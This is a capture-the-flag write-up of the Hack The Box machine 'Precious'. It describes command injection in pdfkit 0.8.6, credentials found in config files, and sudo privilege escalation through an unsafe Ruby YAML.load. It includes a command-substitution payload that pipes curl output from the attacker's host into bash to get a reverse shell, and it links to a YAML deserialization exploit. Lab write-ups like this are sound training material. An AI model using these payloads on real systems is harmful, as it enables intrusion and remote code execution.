---
title: "Forging the One Shell: A PDFKit RCE on HTB 'Precious'"
seo_title: "Hack The Box 'Precious' Write-up: A Step-by-Step Guide"
date: 2025-11-30
layout: single
hideToc: false
tags: ["linux", "hackthebox", "easy", "ruby", "web", "sudo", "pdfkit", "rce"]
summary: "Easy rated box from hackthebox comprising of a Ruby pdfkit RCE for foothold and a sudo misconfiguration for privilege escalation."
---

# Precious

## Box Info

![Precious.png](Precious%20e5d22a709a1d4ec99eb5b1552082d920/Precious.png)

### Nmap scan

```bash
PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
| ssh-hostkey: 
|   3072 84:5e:13:a8:e3:1e:20:66:1d:23:55:50:f6:30:47:d2 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDEAPxqUubE88njHItE+mjeWJXOLu5reIBmQHCYh2ETYO5zatgel+LjcYdgaa4KLFyw8CfDbRL9swlmGTaf4iUbao4jD73HV9/Vrnby7zP04OH3U/wVbAKbPJrjnva/czuuV6uNz4SVA3qk0bp6wOrxQFzCn5OvY3FTcceH1jrjrJmUKpGZJBZZO6cp0HkZWs/eQi8F7anVoMDKiiuP0VX28q/yR1AFB4vR5ej8iV/X73z3GOs3ZckQMhOiBmu1FF77c7VW1zqln480/AbvHJDULtRdZ5xrYH1nFynnPi6+VU/PIfVMpHbYu7t0mEFeI5HxMPNUvtYRRDC14jEtH6RpZxd7PhwYiBctiybZbonM5UP0lP85OuMMPcSMll65+8hzMMY2aejjHTYqgzd7M6HxcEMrJW7n7s5eCJqMoUXkL8RSBEQSmMUV8iWzHW0XkVUfYT5Ko6Xsnb+DiiLvFNUlFwO6hWz2WG8rlZ3voQ/gv8BLVCU1ziaVGerd61PODck=
|   256 a2:ef:7b:96:65:ce:41:61:c4:67:ee:4e:96:c7:c8:92 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBFScv6lLa14Uczimjt1W7qyH6OvXIyJGrznL1JXzgVFdABwi/oWWxUzEvwP5OMki1SW9QKX7kKVznWgFNOp815Y=
|   256 33:05:3d:cd:7a:b7:98:45:82:39:e7:ae:3c:91:a6:58 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIH+JGiTFGOgn/iJUoLhZeybUvKeADIlm0fHnP/oZ66Qb
80/tcp open  http    syn-ack nginx 1.18.0
|_http-server-header: nginx/1.18.0
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Did not follow redirect to http://precious.htb/
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

### Website at TCP 80

The website contains a form to submit a url. The backend fetched the url processed the webpage into a pdf and gave the pdf to the user.

![Untitled](Precious%20e5d22a709a1d4ec99eb5b1552082d920/Untitled.png)

So, hosted a sample webserver and put the url to get a sample pdf.

![Untitled](Precious%20e5d22a709a1d4ec99eb5b1552082d920/Untitled%201.png)

The sample pdf upon inspection showed that it was created by pdfkit v0.8.6. 

![Untitled](Precious%20e5d22a709a1d4ec99eb5b1552082d920/Untitled%202.png)

Simple googling showed that this version of pdfkit was vulnerable to remote code execution where the url is not properly sanitised.

![Untitled](Precious%20e5d22a709a1d4ec99eb5b1552082d920/Untitled%203.png)

The article says that if url contains a url encoded character and shell command substitution string. It would lead to command execution. Although we used a valid url, the article says we can also use just ‘http%20`sleep 5`’ to get command injection.

![Untitled](Precious%20e5d22a709a1d4ec99eb5b1552082d920/Untitled%204.png)

![Untitled](Precious%20e5d22a709a1d4ec99eb5b1552082d920/Untitled%205.png)

After a few attempts, we were able to get a reverse shell by hosting a malicious script file on our own machine and piping it to bash for execution. 

```bash
http://10.10.14.9:8000/?name=#{'%20`curl 10.10.14.9:8000|bash`'}
```

![Untitled](Precious%20e5d22a709a1d4ec99eb5b1552082d920/Untitled%206.png)

After stabilizing the shell we tried to find config files initially in the root web directory. Later moved on to the user home directory of user “ruby”. We were able to get hardcoded credentials for Henry in config files.

![Untitled](Precious%20e5d22a709a1d4ec99eb5b1552082d920/Untitled%207.png)

The user henry could run the update_dependencies.rb file in /opt directory with escalated privileges.

![Untitled](Precious%20e5d22a709a1d4ec99eb5b1552082d920/Untitled%208.png)

```bash
# Compare installed dependencies with those specified in "dependencies.yml"
require "yaml"
require 'rubygems'

# TODO: update versions automatically
def update_gems()
end

def list_from_file
    YAML.load(File.read("dependencies.yml"))
end

def list_local_gems
    Gem::Specification.sort_by{ |g| [g.name.downcase, g.version] }.map{|g| [g.name, g.version.to_s]}
end

gems_file = list_from_file
gems_local = list_local_gems

gems_file.each do |file_name, file_version|
    gems_local.each do |local_name, local_version|
        if(file_name == local_name)
            if(file_version != local_version)
                puts "Installed version differs from the one specified in file: " + local_name
            else
                puts "Installed version is equals to the one specified in file: " + local_name
            end
        end
    end
end
```

![Untitled](Precious%20e5d22a709a1d4ec99eb5b1552082d920/Untitled%209.png)

![Untitled](Precious%20e5d22a709a1d4ec99eb5b1552082d920/Untitled%2010.png)

### References

[https://security.snyk.io/vuln/SNYK-RUBY-PDFKIT-2869795](https://security.snyk.io/vuln/SNYK-RUBY-PDFKIT-2869795)

[https://gist.github.com/staaldraad/89dffe369e1454eedd3306edc8a7e565?ref=blog.stratumsecurity.com#file-ruby_yaml_load_sploit2-yaml](https://gist.github.com/staaldraad/89dffe369e1454eedd3306edc8a7e565?ref=blog.stratumsecurity.com#file-ruby_yaml_load_sploit2-yaml)

[https://blog.stratumsecurity.com/2021/06/09/blind-remote-code-execution-through-yaml-deserialization/](https://blog.stratumsecurity.com/2021/06/09/blind-remote-code-execution-through-yaml-deserialization/)